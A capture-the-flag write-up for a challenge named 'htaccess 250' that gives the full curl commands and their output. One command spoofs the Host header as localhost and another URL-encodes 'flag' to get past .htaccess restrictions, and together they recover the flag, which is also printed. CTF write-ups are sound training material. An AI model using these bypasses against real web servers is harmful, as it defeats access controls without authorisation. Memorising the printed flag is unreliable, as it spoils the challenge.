# htaccess 250
```
Your job is to bypass these htaccess restrictions and view the flag files anyway. Good luck!
```
>[http://htaccess.uctf.ir/](http://htaccess.uctf.ir/)

# Solution
There is two parts to this challenge. Both parts must match the regex to obtain the full flag. 

Part One: Set HTTP HOST to localhost

```
curl 'http://htaccess.uctf.ir/one/flag.txt' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
  -H 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,zh-CN;q=0.7,zh;q=0.6' \
  -H 'Cache-Control: max-age=0' \
  -H 'Connection: keep-alive' \
  -H 'Referer: http://htaccess.uctf.ir/' \
  -H 'Host: localhost' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36' \
  --compressed \
  --insecure
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    10  100    10    0     0     14      0 --:--:-- --:--:-- --:--:--    14

uctf{Sule_
```

Part Two: Do not use the word "flag" in the request. Can use URL Encoding to bypass the filter
```
curl 'http://htaccess.uctf.ir/two/%66%6C%61%67.txt' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
  -H 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,zh-CN;q=0.7,zh;q=0.6' \
  -H 'Cache-Control: max-age=0' \
  -H 'Connection: keep-alive' \
  -H 'Referer: http://htaccess.uctf.ir/' \
  -H 'Host: localhost' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36' \
  --compressed \
  --insecure
% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    16  100    16    0     0     25      0 --:--:-- --:--:-- --:--:--    25

Dukol_waterfall}
```
# Flag
```
uctf{Sule_Dukol_waterfall}
```
